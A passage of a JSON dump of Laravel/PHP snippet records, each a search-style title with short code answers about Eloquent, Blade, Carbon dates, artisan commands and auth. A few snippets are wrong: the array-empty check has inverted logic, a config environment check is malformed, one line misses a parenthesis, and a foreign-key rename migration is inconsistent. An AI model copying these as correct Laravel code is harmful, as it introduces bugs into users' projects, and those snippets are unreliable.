    "reg_date": "2021-10-12T10:15:35.000Z"
  },
  {
    "id": 2072,
    "keyword": null,
    "link": null,
    "title": " laravel apache public folder",
    "description": "//Laravel -> Jump to /public by default //On the root file create an htaccess file with this data: RewriteEngine On RewriteCond %{REQUEST_URI} !^/public/ RewriteRule ^(.*)$ /public/$1 [L,QSA]\n",
    "reg_date": "2021-10-12T10:15:35.000Z"
  },
  {
    "id": 2073,
    "keyword": null,
    "link": null,
    "title": " laravel api form request validation 404",
    "description": "Set an \"Accept\": \"application/json\" Request Header  -- OR -- force the default response behavior by sepcifying the response() method in your own CustomFormRequest class: // -- example -- // public function response(array $errors) {     // Always return JSON.     return response()->json($errors, 422); }\n",
    "reg_date": "2021-10-12T10:15:36.000Z"
  },
  {
    "id": 2074,
    "keyword": null,
    "link": null,
    "title": " laravel app get locale",
    "description": "App::getLocale();\n",
    "reg_date": "2021-10-12T10:15:36.000Z"
  },
  {
    "id": 2075,
    "keyword": null,
    "link": null,
    "title": " laravel append array to array",
    "description": "$arr = [\"1\", \"2\"]; array_push($arr, \"3\");\n$fruits = [\"apple\", \"banana\"]; // array_push() function inserts one or more elements to the end of an array array_push($fruits, \"orange\");  // If you use array_push() to add one element to the array, it's better to use // $fruits[] = because in that way there is no overhead of calling a function. $fruits[] = \"orange\";  // output: Array ( [0] => apple [1] => banana [2] => orange )\n$array = array('foo' => 'bar');  $array = array_add($array, 'key', 'value');\n",
    "reg_date": "2021-10-12T10:15:36.000Z"
  },
  {
    "id": 2076,
    "keyword": null,
    "link": null,
    "title": " laravel array pluck",
    "description": "$users = User::all()->pluck('field_name'); //for keys instead of [User::all()->pluck('id');] use $user_ids = User::all()->modelKeys();\n$array = [     ['developer' => ['id' => 1, 'name' => 'Taylor']],     ['developer' => ['id' => 2, 'name' => 'Abigail']], ];  $array = array_pluck($array, 'developer.name');  // ['Taylor', 'Abigail'];\n$name = DB::table('users')->where('name', 'John')->pluck('name');\n$users = Users::pluck('name','email'); dd($users);\n$array = array_pluck($array, 'developer.name', 'developer.id');  // [1 => 'Taylor', 2 => 'Abigail'];\n",
    "reg_date": "2021-10-12T10:15:36.000Z"
  },
  {
    "id": 2077,
    "keyword": null,
    "link": null,
    "title": " laravel array to object",
    "description": "$object = (object) $array;\npublic function index() {      $user = Auth::user();     $page = array(         'title' => 'Hello World',         'template' => 'welcome',     );      $page = (object)$page;      return View('index', array(         'user' => $user,         'page' => $page,     ));  } \n$users = App\\User::all(); $users = $users->toArray();\nfunction objectToArray(&$object) {     return @json_decode(json_encode($object), true); } \n",
    "reg_date": "2021-10-12T10:15:36.000Z"
  },
  {
    "id": 2078,
    "keyword": null,
    "link": null,
    "title": " laravel array to string conversion",
    "description": "$history = []; foreach($array as $value){    $array = [        'value' => $value,        'status_id' => 2    ];    array_push($history, $array); }\n         if(!empty($value))                 {                     foreach ($value as $v)                      {                            $insert[] = ['name' => $v['name'], 'email' => $v['email'],'company_name' => $v['company_name'],'company_id' => $v['company_id'], 'emp_id' => $v['emp_id']];                               $role_id= $v['role_id'];                          $name=$v['name'];                          $email=$v['email'];                          $emails[]=$v['email'];                          $emp_id=$v['emp_id'];                                                $data = array( 'name' => $name,'email' => $email , 'emp_id' => $emp_id);                          $roles[]= $v['role_id'];                       }                 }             }              if(!empty($insert))             {                  $inserted=User::insert($insert);                  if($inserted)                  {                      $email_select=User::select('id')->whereIn('email',$emails)->where('company_id',Auth::user()->company_id)->orderBy('id','Asc')->get();                     foreach ($email_select as $key => $idget)                      {                         $getid[]=$idget->id;                     }                  }                  $datas[]=['user_id' => $getid , 'role_id' => $roles];                                    $insert_role=DB::table('role_user')->insert($datas) ; \n",
    "reg_date": "2021-10-12T10:15:36.000Z"
  },
  {
    "id": 2079,
    "keyword": null,
    "link": null,
    "title": " laravel artisan call with confirm",
    "description": "protected $signature = 'order:check {--silent=y}'        public function handle() { $silent = $this->option('silent'); if ($this->confirm('This will run the command code continue?') || $silent) {\n",
    "reg_date": "2021-10-12T10:15:36.000Z"
  },
  {
    "id": 2080,
    "keyword": null,
    "link": null,
    "title": " laravel artisan clear cache",
    "description": "php artisan cache:clear php artisan route:clear php artisan config:clear  php artisan view:clear \n//laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n//Updated Dec 2020 //laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n/**[SAFE] Clears all cache with 1 line!**/  php artisan route:clear &&   php artisan view:clear &&  php artisan config:clear && php artisan cache:clear &&  php artisan clear-compiled\nphp artisan cache:clear php artisan view:clear php artisan route:clear php artisan clear-compiled php artisan config:cache \nbefore change: php artisan cache:clear php artisan config:clear php artisan route:clear after change: php artisan config:cache php artisan route:cache php artisan optimize\n",
    "reg_date": "2021-10-12T10:15:36.000Z"
  },
  {
    "id": 2081,
    "keyword": null,
    "link": null,
    "title": " laravel artisan create criteria",
    "description": "php artisan make:criteria MyCriteria \n",
    "reg_date": "2021-10-12T10:15:36.000Z"
  },
  {
    "id": 2082,
    "keyword": null,
    "link": null,
    "title": " laravel artisan progress bar",
    "description": "public function handle() {     $this->output->progressStart(10);      for ($i = 0; $i < 10; $i++) {         sleep(1);          $this->output->progressAdvance();     }      $this->output->progressFinish(); }\n",
    "reg_date": "2021-10-12T10:15:36.000Z"
  },
  {
    "id": 2083,
    "keyword": null,
    "link": null,
    "title": " laravel asset",
    "description": "// To access laravel assets asset('sp-icon/Vodacom-Original.svg')  // To echo the value use braces {{ asset('you-are-in-public/your-file-name') }}\nasset() \nuse Illuminate\\Support\\Str;  $length = Str::length('Laravel');  // 7\n",
    "reg_date": "2021-10-12T10:15:36.000Z"
  },
  {
    "id": 2084,
    "keyword": null,
    "link": null,
    "title": " laravel assign active based on route name",
    "description": "{{  request()->routeIs('news.*') ? 'active' : '' }}\n <li class=\"{{ Request::is('products*') ? 'active' : '' }}\">      <a href=\"{{ route('products.index') }}\"><span>Products</span></a>  </li> \n <li class = \"{{ set_active('admin/users') }}\">     <a href=\"{{ url('/admin/users/') }}\">Users</a> </li> \nfunction set_active( $route ) {     if( is_array( $route ) ){         return in_array(Request::path(), $route) ? 'active' : '';     }     return Request::path() == $route ? 'active' : ''; } \n",
    "reg_date": "2021-10-12T10:15:37.000Z"
  },
  {
    "id": 2085,
    "keyword": null,
    "link": null,
    "title": " laravel auth 6",
    "description": "composer require laravel/ui php artisan ui vue --auth\ncomposer require laravel/ui  php artisan ui vue --auth  npm install && npm run dev\ncomposer require laravel/ui \"^1.0\" --dev  php artisan ui vue --auth\n",
    "reg_date": "2021-10-12T10:15:37.000Z"
  },
  {
    "id": 2086,
    "keyword": null,
    "link": null,
    "title": " laravel auth login with phone or email",
    "description": "<?php  namespace App\\Http\\Controllers\\Auth;  use App\\Http\\Controllers\\Controller; use App\\Providers\\RouteServiceProvider; use Illuminate\\Foundation\\Auth\\AuthenticatesUsers; use Illuminate\\Http\\Request; use Illuminate\\Validation\\ValidationException;  class LoginController extends Controller {     /*     |--------------------------------------------------------------------------     | Login Controller     |--------------------------------------------------------------------------     |     | This controller handles authenticating users for the application and     | redirecting them to your home screen. The controller uses a trait     | to conveniently provide its functionality to your applications.     |     */      use AuthenticatesUsers;      /**      * Where to redirect users after login.      *      * @var string      */     protected $redirectTo = RouteServiceProvider::HOME;      /**      * Create a new controller instance.      *      * @return void      */     public function __construct()     {         $this->middleware('guest')->except('logout');     }      /**      * Get the failed login response instance.      *      * @param  \\Illuminate\\Http\\Request  $request      * @return \\Symfony\\Component\\HttpFoundation\\Response      *      * @throws \\Illuminate\\Validation\\ValidationException      */     protected function sendFailedLoginResponse(Request $request)     {         throw ValidationException::withMessages([             'username' => [trans('auth.failed')],         ]);     }      /**      * Get the login username to be used by the controller.      *      * @return string      */     public function username()     {         $login = request()->input('username');          if(is_numeric($login)){             $field = 'phone';         } elseif (filter_var($login, FILTER_VALIDATE_EMAIL)) {             $field = 'email';         } else {             $field = 'username';         }          request()->merge([$field => $login]);          return $field;     } }  \n",
    "reg_date": "2021-10-12T10:15:37.000Z"
  },
  {
    "id": 2087,
    "keyword": null,
    "link": null,
    "title": " laravel auth namespace",
    "description": "use Illuminate\\Support\\Facades\\Auth;\nAuth::login($user);\n",
    "reg_date": "2021-10-12T10:15:37.000Z"
  },
  {
    "id": 2088,
    "keyword": null,
    "link": null,
    "title": " laravel auth user id",
    "description": "$userId = Auth::id();\n",
    "reg_date": "2021-10-12T10:15:37.000Z"
  },
  {
    "id": 2089,
    "keyword": null,
    "link": null,
    "title": " laravel automatically generate unique username",
    "description": "Str::slug($request->name) . (User::max('id') + random_int(99, 99999))\n",
    "reg_date": "2021-10-12T10:15:37.000Z"
  },
  {
    "id": 2090,
    "keyword": null,
    "link": null,
    "title": " laravel back button",
    "description": "<a href=\"{{ url()->previous() }}\" class=\"btn btn-default\">Back</a>\n",
    "reg_date": "2021-10-12T10:15:37.000Z"
  },
  {
    "id": 2091,
    "keyword": null,
    "link": null,
    "title": " laravel base table or view not found hasmany",
    "description": "// Laravel can't determine the plural form of the word you used for your table name.  // Just specify your table in the model as such:  class Cotizacion extends Model{     public $table = \"your table name\"; \nIt seems Laravel is trying to use category_posts table (because of many-to-many relationship). But you don't have this table, because you've created category_post table. Change name of the table to category_posts.\n",
    "reg_date": "2021-10-12T10:15:37.000Z"
  },
  {
    "id": 2092,
    "keyword": null,
    "link": null,
    "title": " laravel base url",
    "description": "{{ URL::previous() }} \nURL::to('/');\n// Get the base URL. echo url('');  // Get the app URL from configuration which we set in .env file. echo config('app.url');  \nuse Illuminate\\Support\\Facades\\URL;  echo URL::current();\n{{ URL::asset('css/css.css') }} \n",
    "reg_date": "2021-10-12T10:15:37.000Z"
  },
  {
    "id": 2093,
    "keyword": null,
    "link": null,
    "title": " laravel before migration",
    "description": "Schema::table('users', function ($table) {     $table->string('email')->after('id')->nullable(); });\n",
    "reg_date": "2021-10-12T10:15:37.000Z"
  },
  {
    "id": 2094,
    "keyword": null,
    "link": null,
    "title": " laravel between dates",
    "description": "$from = date('2018-01-01'); $to = date('2018-05-02');  Reservation::whereBetween('reservation_from', [$from, $to])->get();\n//How to calculate date different between two dates in larevel // METHOD-1 $date1 = new DateTime(\"2018-01-10 00:00:00\"); $date2 = new DateTime(\"2019-05-18 01:23:45\"); $difference = $date1->diff($date2); $diffInSeconds = $difference->s; //45 $diffInMinutes = $difference->i; //23 $diffInHours   = $difference->h; //8 $diffInDays    = $difference->d; //21 $diffInMonths  = $difference->m; //4 $diffInYears   = $difference->y; //1  //or get Date difference as total difference //METHOD-2 $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\n$from = date('2018-01-01'); $to = date('2018-05-02');  Reservation::whereBetween('reservation_from', [$from, $to])->get(); \n<?php    //check if date between two dates $currentDate = date('Y-m-d'); $currentDate = date('Y-m-d', strtotime($currentDate));    $startDate = date('Y-m-d', strtotime(\"01/09/2019\")); $endDate = date('Y-m-d', strtotime(\"01/10/2019\"));    if (($currentDate >= $startDate) && ($currentDate <= $endDate)){      echo \"Current date is between two dates\"; }else{       echo \"Current date is not between two dates\";   } //@sujay\n// how to get dates between two dates in laravel?  //NOTE => for this you can use Carbon use Carbon\\CarbonPeriod;  $period = CarbonPeriod::create(\"2020-5-20\", \"2020-5-30\"); foreach ($period as $date) {   // Insert Dates into listOfDates Array   $listOfDates[] = $date->format('Y-m-d'); }  // Now You Can Review This Array dd($listOfDates); \n",
    "reg_date": "2021-10-12T10:15:38.000Z"
  },
  {
    "id": 2095,
    "keyword": null,
    "link": null,
    "title": " laravel bindings query",
    "description": "$query = DB::table('table')->whereIn('some_field', [1,2,30]);  $sql = $query->toSql();  $bindings = $query->getBindings();\n",
    "reg_date": "2021-10-12T10:15:38.000Z"
  },
  {
    "id": 2096,
    "keyword": null,
    "link": null,
    "title": " laravel blade check if yielded content exists",
    "description": "<title>     @if(View::hasSection('title'))         @yield('title')     @else         Static Website Title Here     @endif </title>\n",
    "reg_date": "2021-10-12T10:15:38.000Z"
  },
  {
    "id": 2097,
    "keyword": null,
    "link": null,
    "title": " laravel blade components",
    "description": "@for ($i = 0; $i < 10; $i++)     The current value is {{ $i }} @endfor  @foreach ($users as $user)     <p>This is user {{ $user->id }}</p> @endforeach  @forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse  @while (true)     <p>I'm looping forever.</p> @endwhile\n@foreach ($users as $user)     @if ($loop->first)         This is the first iteration.     @endif      @if ($loop->last)         This is the last iteration.     @endif      <p>This is user {{ $user->id }}</p> @endforeach\n// Create component in terminal using : \tphp artisan make:component MyComponent    // 2 files will be made :  // * app\\View\\Components\\MyComponent.php  //   - Handels functionality. // * resources\\views\\components\\my-component.blade.php () //   - Code snippet for component. Must be inside <div>...</div>.   \t // Call component in any other blade file using : \t<x-my-component />  // Send hardcoded parameter :     <x-my-component name=\"Hello World!\"/>  // Send a php parameter :     <x-my-component :text=\"$message\"/> \n<x-inputs.button/>\n",
    "reg_date": "2021-10-12T10:15:38.000Z"
  },
  {
    "id": 2098,
    "keyword": null,
    "link": null,
    "title": " laravel blade date format",
    "description": "//laravel method 1 {{ $data->created_at->isoFormat('dddd D') }}  //laravel method 2  {!! date('d/M/y', strtotime($data->created_at)) !!}\ndate('d-m-Y', strtotime($user->from_date)); /** or **/ date_format($user->from_date,'D M Y')\n{{\\Carbon\\Carbon::createFromFormat('H:i:s',$time)->format('h:i')}}  {{$item->date_seance->format('d/m/Y') }}  {{date('H:i', strtotime($item->start_time)) }}  \ndate('d-m-Y', strtotime($user->from_date)); \n{!! htmlspecialchars_decode(date('j<\\s\\up>S</\\s\\up> F Y', strtotime('21-05-2020'))) !!} \n{{ $post->created_at->diffForHumans() }}   /*   \t//Output   Arya Stuck 14 minutes ago   Post something       Mizan Khan 23 hours ago   Post something   */\n",
    "reg_date": "2021-10-12T10:15:38.000Z"
  },
  {
    "id": 2099,
    "keyword": null,
    "link": null,
    "title": " laravel blade dump",
    "description": "// Add in blade template file {{ dd($YourPassedVariable) }}\n// dump <?php dump($array)?> // dump and die <?php dd($array)?>\n",
    "reg_date": "2021-10-12T10:15:38.000Z"
  },
  {
    "id": 2100,
    "keyword": null,
    "link": null,
    "title": " laravel blade empty",
    "description": " @empty($products)         <p class=\"bg-danger text-white p-1\">product</p> @else         <p class=\"bg-danger text-white p-1\">no product</p>  @endempty\n@isset($records)     // $records is defined and is not null... @endisset  @empty($records)     // $records is \"empty\"... @endempty\n",
    "reg_date": "2021-10-12T10:15:38.000Z"
  },
  {
    "id": 2101,
    "keyword": null,
    "link": null,
    "title": " laravel blade errors all",
    "description": "@if($errors->any())     {!! implode('', $errors->all('<span class=\"text text-danger\">:message</span>')) !!} @endif\n@if($errors->has())    @foreach ($errors->all() as $error)       <div>{{ $error }}</div>   @endforeach @endif\n",
    "reg_date": "2021-10-12T10:15:38.000Z"
  },
  {
    "id": 2102,
    "keyword": null,
    "link": null,
    "title": " laravel blade file naming conventine",
    "description": "Please, have a look at this document to get the best naming convention for laravel    https://xqsit.github.io/laravel-coding-guidelines/docs/naming-conventions/  https://webdevetc.com/blog/laravel-naming-conventions/\n",
    "reg_date": "2021-10-12T10:15:38.000Z"
  },
  {
    "id": 2103,
    "keyword": null,
    "link": null,
    "title": " laravel blade for loop",
    "description": "<div>     @for ($i = 0; $i < $max; $i++) //Where $max is whatever you need as break condition.         <p>{{ $i }}</p> //This would print $i in a paragraph. You do whatever you need here.     @endfor </div>\n// For @for ($i = 0; $i < max_value; $i++)      //your code @endfor //Foreach @foreach ($items as $item)      //your code @endforeach\n@for ($i = 0; $i < 10; $i++)     The current value is {{ $i }} @endfor  @foreach ($users as $user)     <p>This is user {{ $user->id }}</p> @endforeach  @forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse  @while (true)     <p>I'm looping forever.</p> @endwhile\n@forelse ($users as $user)     <li>{{ $user->name }}</li> @empty     <p>No users</p> @endforelse\n@if (count($records) === 1)     I have one record! @elseif (count($records) > 1)     I have multiple records! @else     I don't have any records! @endif\n$loop->index Returns a 0-based current loop iteration; 0 would mean the first iteration $loop->iteration Returns a 1-based current loop iteration; 1 would mean the first iteration $loop->remaining Number of iterations remaining in the loop; if there are a total of 10 iterations and the current iteration is 3, it would return 7 $loop->count Returns the total number of iterations or the total number of items in the array $loop->first Returns true if it is the first iteration or item in the loop else returns false. $loop->last Returns true if it is the last iteration or item in the loop else return false. $loop->depth Returns the depth or nesting level of the current loop; returns 2 if it is a loop within a loop and 3 if it is nested one level more $loop->parentIf this loop is nested within another @foreach loop, parent returns the parent&rsquo;s loop\n",
    "reg_date": "2021-10-12T10:15:38.000Z"
  },
  {
    "id": 2104,
    "keyword": null,
    "link": null,
    "title": " laravel blade route redirect back",
    "description": "return Redirect::back()->withErrors(['msg', 'The Message']);  and inside your view call this  @if($errors->any()) <h4>{{$errors->first()}}</h4> @endif\nreturn back();  return redirect()->back();  return redirect()->previous(); \n{{ url()->previous() }}\n",
    "reg_date": "2021-10-12T10:15:39.000Z"
  },
  {
    "id": 2105,
    "keyword": null,
    "link": null,
    "title": " laravel blade uppercase",
    "description": "use Illuminate\\Support\\Str;  ...  $string = Str::ucfirst('foo bar');\npublic function getProvince($value) {     return strtoupper($value); } \n{{ Str::upper($data_agenda->content) }} \n",
    "reg_date": "2021-10-12T10:15:39.000Z"
  },
  {
    "id": 2106,
    "keyword": null,
    "link": null,
    "title": " laravel bootstrap auth",
    "description": "// How to install Auth in laravel  // With Boothstrap composer require laravel/ui --dev php artisan ui bootstrap --auth npm install && npm run dev  // With VUE composer require laravel/ui --dev php artisan ui vue --auth npm install && npm run dev\n// Generate basic scaffolding... php artisan ui bootstrap php artisan ui vue php artisan ui react  // Generate login / registration scaffolding... php artisan ui bootstrap --auth php artisan ui vue --auth php artisan ui react --auth\n",
    "reg_date": "2021-10-12T10:15:39.000Z"
  },
  {
    "id": 2107,
    "keyword": null,
    "link": null,
    "title": " laravel bootstrap nav active",
    "description": "{{ Route::currentRouteNamed('about') ? 'active' : '' }}\n<li class=\"{{ (request()->is('admin/cities')) ? 'active' : '' }}\">   //view page for more examples a good use cases\n",
    "reg_date": "2021-10-12T10:15:39.000Z"
  },
  {
    "id": 2108,
    "keyword": null,
    "link": null,
    "title": " laravel bootstrap ui",
    "description": "// Generate basic scaffolding... php artisan ui bootstrap php artisan ui vue php artisan ui react  // Generate login / registration scaffolding... php artisan ui bootstrap --auth php artisan ui vue --auth php artisan ui react --auth\n",
    "reg_date": "2021-10-12T10:15:39.000Z"
  },
  {
    "id": 2109,
    "keyword": null,
    "link": null,
    "title": " laravel call controller method from view",
    "description": "Just try this in your view :  {{ ControllerName::Functionname($params); }} OR  <?php echo ControllerName::Functionname($params);?>\nreturn \\App::call('bla\\bla\\ControllerName@functionName');\n",
    "reg_date": "2021-10-12T10:15:39.000Z"
  },
  {
    "id": 2110,
    "keyword": null,
    "link": null,
    "title": " laravel carbon",
    "description": "Carbon::createFromFormat('Y-m-d H:i:s', $request->date)->format('d-m-Y')\n<?php use Carbon\\Carbon;\n$comment->created_at->diffForHumans();\n1. First parse the created_at field as Carbon object. \t$createdAt = Carbon::parse($item['created_at']);  2.Then you can use \t$suborder['payment_date'] = $createdAt->format('M d Y');\nCarbon::now('UTC')->addHour($hours)->format('Y-m-d H:i:s')\n$now = Carbon::now(); echo $now;                               // 2020-03-22 17:45:58 echo \"\\n\"; $today = Carbon::today(); echo $today;                             // 2020-03-22 00:00:00 echo \"\\n\"; $tomorrow = Carbon::tomorrow('Europe/London'); echo $tomorrow;                          // 2020-03-23 00:00:00 echo \"\\n\"; $yesterday = Carbon::yesterday(); echo $yesterday;                         // 2020-03-21 00:00:00\n",
    "reg_date": "2021-10-12T10:15:39.000Z"
  },
  {
    "id": 2111,
    "keyword": null,
    "link": null,
    "title": " laravel carbon add minutes",
    "description": "Carbon::now()->addMinutes($minutes)->timestamp;\nCarbon::createFromFormat('Y-m-d H:i:s', $request->date)->format('d-m-Y')\nTry to parse() it first: $date = Carbon::parse($dateTime)             ->addSeconds($seconds)             ->format('Y-m-d H:i:s');\n<?php  namespace App\\Http\\Controllers;  use Illuminate\\Http\\Request;use Carbon\\Carbon;  class SignaturePadController extends Controller{    /**     * Write code on Method     *     * @return response()     */    public function index()    {        $currentDateTime = Carbon::now();        $newDateTime = Carbon::now()->addMinutes(5);                     print_r($currentDateTime);        print_r($newDateTime);    }}\n",
    "reg_date": "2021-10-12T10:15:39.000Z"
  },
  {
    "id": 2112,
    "keyword": null,
    "link": null,
    "title": " laravel carbon create date from string",
    "description": "use Carbon/Carbon Carbon::now()->format('Y-m-d H:i:s');\n$today = Carbon::now()->format('Y-m-d'); //yyyy-mm-dd etc\nCarbon::createFromFormat('Y-m-d H:i:s', $request->date)->format('d-m-Y')\n$today = Carbon::createFromFormat('d/m/Y H:i:s',  '19/02/2019 00:00:00');   $day = $today->subDays(1)->format('d/m/Y'); \n1. First parse the created_at field as Carbon object. \t$createdAt = Carbon::parse($item['created_at']);  2.Then you can use \t$suborder['payment_date'] = $createdAt->format('M d Y');\n$now = Carbon::now(); echo $now;                               // 2020-03-22 17:45:58 echo \"\\n\"; $today = Carbon::today(); echo $today;                             // 2020-03-22 00:00:00 echo \"\\n\"; $tomorrow = Carbon::tomorrow('Europe/London'); echo $tomorrow;                          // 2020-03-23 00:00:00 echo \"\\n\"; $yesterday = Carbon::yesterday(); echo $yesterday;                         // 2020-03-21 00:00:00\n",
    "reg_date": "2021-10-12T10:15:39.000Z"
  },
  {
    "id": 2113,
    "keyword": null,
    "link": null,
    "title": " laravel carbon get month number",
    "description": "use Carbon\\Carbon; // Date = 7th of July 2021 $month = Carbon::now()->format('M'); // July $month = Carbon::now()->format('m'); // 07 $month = Carbon::now()->month; // 7\nuse Carbon\\Carbon;  // if today is January 22, 2021 Carbon::now()->format('M'); // \"Jan\" Carbon::now()->format('m'); // \"01\" Carbon::now()->month; // 1 \n",
    "reg_date": "2021-10-12T10:15:40.000Z"
  },
  {
    "id": 2114,
    "keyword": null,
    "link": null,
    "title": " laravel carbon get year number",
    "description": "use Carbon\\Carbon; // Date = 7th of July 2021 $year = Carbon::now()->format('Y'); // 2021 $year = Carbon::now()->format('y'); // 21 $year = Carbon::now()->year; // 2021\n",
    "reg_date": "2021-10-12T10:15:40.000Z"
  },
  {
    "id": 2115,
    "keyword": null,
    "link": null,
    "title": " laravel carbon human readable",
    "description": "$comment->created_at->diffForHumans();\n",
    "reg_date": "2021-10-12T10:15:40.000Z"
  },
  {
    "id": 2116,
    "keyword": null,
    "link": null,
    "title": " laravel carbon isoformat",
    "description": "Carbon::createFromFormat('Y-m-d H:i:s', $request->date)->format('d-m-Y')\n<?php use Carbon\\Carbon;\n1. First parse the created_at field as Carbon object. \t$createdAt = Carbon::parse($item['created_at']);  2.Then you can use \t$suborder['payment_date'] = $createdAt->format('M d Y');\nCarbon::now()->toISOString()\n",
    "reg_date": "2021-10-12T10:15:40.000Z"
  },
  {
    "id": 2117,
    "keyword": null,
    "link": null,
    "title": " laravel carbon set timezone",
    "description": "Carbon::now('UTC')  //or  now('UTC') \nin the AppServiceProvider.php you can add the php functionality to alter the timestamp for the whole project  public function boot() {     Schema::defaultStringLength(191);     date_default_timezone_set('Asia/Aden'); }\nCarbon::now('UTC') \n",
    "reg_date": "2021-10-12T10:15:40.000Z"
  },
  {
    "id": 2118,
    "keyword": null,
    "link": null,
    "title": " laravel carbon time format AM PM",
    "description": "$now = Carbon::now(); echo $now->format('g:i A'); \n",
    "reg_date": "2021-10-12T10:15:40.000Z"
  },
  {
    "id": 2119,
    "keyword": null,
    "link": null,
    "title": " laravel carbon today date format",
    "description": "use Carbon\\Carbon; $date = Carbon::now(); //Get date and time $date->toDateTimeString(); //Get date $date->toDateString();\n    $posts = Post::whereDate('created_at', Carbon::today())->get();\n$today = Carbon::now()->format('Y-m-d'); //yyyy-mm-dd etc\n",
    "reg_date": "2021-10-12T10:15:40.000Z"
  },
  {
    "id": 2120,
    "keyword": null,
    "link": null,
    "title": " laravel cashier overwrite users table name",
    "description": "php artisan vendor:publish --tag=\"cashier-migrations\"  Publish cashier migrationsh and change it as you want.  Don't forget to set up your model properly. Good luck :)  https://laravel.com/docs/8.x/billing#database-migrations\n",
    "reg_date": "2021-10-12T10:15:40.000Z"
  },
  {
    "id": 2121,
    "keyword": null,
    "link": null,
    "title": " laravel catch exception ex log save",
    "description": "use Illuminate\\Support\\Facades\\Log;  catch (\\Exception $ex) {             Log::error($ex);         }   \n",
    "reg_date": "2021-10-12T10:15:40.000Z"
  },
  {
    "id": 2122,
    "keyword": null,
    "link": null,
    "title": " laravel change column",
    "description": "Schema::table('users', function (Blueprint $table) {     $table->renameColumn('from', 'to'); });\nSchema::table('users', function (Blueprint $table) {     $table->string('name', 50)->nullable()->change(); });\nSchema::rename($currentTableName, $newTableName);\nphp artisan make:migration CreateUsersTable\nphp artisan make:Model Product -m -c  --resource\n",
    "reg_date": "2021-10-12T10:15:40.000Z"
  },
  {
    "id": 2123,
    "keyword": null,
    "link": null,
    "title": " laravel change foreign key name",
    "description": "Schema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); }); OR Schema::table('posts', function (Blueprint $table) {     $table->foreignId('user_id')->constrained(); });\nSchema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); });\n//Note : Before Renaming Foreign, You Must Need To Delete Old Foreign And Assign New One class RenameColumn extends Migration {      public function up()     {         Schema::table('holidays', function(Blueprint $table) {             $table->dropForeign('holidays_account_id_foreign');             $table->renameColumn('account_id ', 'engagement_id');              $table->foreign('account_id')->references('id')->on('accounts')->onDelete('cascade');         });     }      public function down()     {         Schema::table('holidays', function(Blueprint $table) {             $table->dropForeign('holidays_engagement_id_foreign');             $table->renameColumn('account_id ', 'engagement_id');              $table->foreign('account_id')->references('id')->on('accounts')->onDelete('cascade');         });     } } \n$table->foreignId('user_id')       ->constrained(\"users\") <- // You don't need to specify table if it matched laravel naming conventions.       ->onUpdate('cascade')       ->onDelete('cascade');\n",
    "reg_date": "2021-10-12T10:15:41.000Z"
  },
  {
    "id": 2124,
    "keyword": null,
    "link": null,
    "title": " laravel change post request before save",
    "description": "public function store(Request $request) {     $data = $request->all();     $data['hostname'] = gethostbyaddr($_SERVER['REMOTE_ADDR'];      Systems::create($data); } \n",
    "reg_date": "2021-10-12T10:15:41.000Z"
  },
  {
    "id": 2125,
    "keyword": null,
    "link": null,
    "title": " laravel check auth",
    "description": "use Illuminate\\Support\\Facades\\Auth;  if (Auth::check()) {     // The user is logged in... }\ncomposer require laravel/ui  php artisan ui vue --auth  npm install && npm run dev\n//namespace use Illuminate\\Support\\Facades\\Auth;\nAuth::login($user);\n",
    "reg_date": "2021-10-12T10:15:41.000Z"
  },
  {
    "id": 2126,
    "keyword": null,
    "link": null,
    "title": " laravel check collection not empty",
    "description": "if ($mentor->first()) { }  if (!$mentor->isEmpty()) { } if ($mentor->count()) { } if (count($mentor)) { } if ($mentor->isNotEmpty()) { } \n",
    "reg_date": "2021-10-12T10:15:41.000Z"
  },
  {
    "id": 2127,
    "keyword": null,
    "link": null,
    "title": " laravel check environment",
    "description": "if (App::environment('local')) {     // The environment is local }  if (App::environment(['local', 'staging'])) {     // The environment is either local OR staging... }  // or using the 'app' helper if (app()->environment('local')) {     // The environment is local }  if (app()->environment(['local', 'staging'])) {     // The environment is either local OR staging... }  // using config if(config('app.env' == 'local')){ \t// The environment is local }  if(in_array(config('app.env'), ['local', 'staging'])){ \t// The environment is either local OR staging... }\ndd(env('APP_NAME'));\nif (\\Illuminate\\Support\\Facades\\App::environment('production')) {     // The environment is production }\nif (App::environment('local')) {     // The environment is local }  if (App::environment(['local', 'staging'])) {     // The environment is either local OR staging... }\n",
    "reg_date": "2021-10-12T10:15:41.000Z"
  },
  {
    "id": 2128,
    "keyword": null,
    "link": null,
    "title": " laravel check if array is empty",
    "description": " //for get() array methods if($data_array->isEmpty()) {dd('EMPTY');} else {dd('NOT EMPTY');}  //for other array if (count($data_array) > 0)  {dd('EMPTY');} else {dd('NOT EMPTY');}\n",
    "reg_date": "2021-10-12T10:15:41.000Z"
  },
  {
    "id": 2129,
    "keyword": null,
    "link": null,
    "title": " laravel check if eloquent just created",
    "description": "$item = Item::firstOrCreate(['title' => 'Example Item']);  if ($item->wasRecentlyCreated === true) {     // item wasn't found and have been created in the database } else {     // item was found and returned from the database } \n",
    "reg_date": "2021-10-12T10:15:41.000Z"
  },
  {
    "id": 2130,
    "keyword": null,
    "link": null,
    "title": " laravel check if email is verified",
    "description": "$user->hasVerifiedEmail()\n<?php $email = \"john.doe@example.com\";  if (filter_var($email, FILTER_VALIDATE_EMAIL)) {   echo(\"$email is a valid email address\"); } else {   echo(\"$email is not a valid email address\"); } ?>\n",
    "reg_date": "2021-10-12T10:15:41.000Z"
  },
  {
    "id": 2131,
    "keyword": null,
    "link": null,
    "title": " laravel check if field has changed",
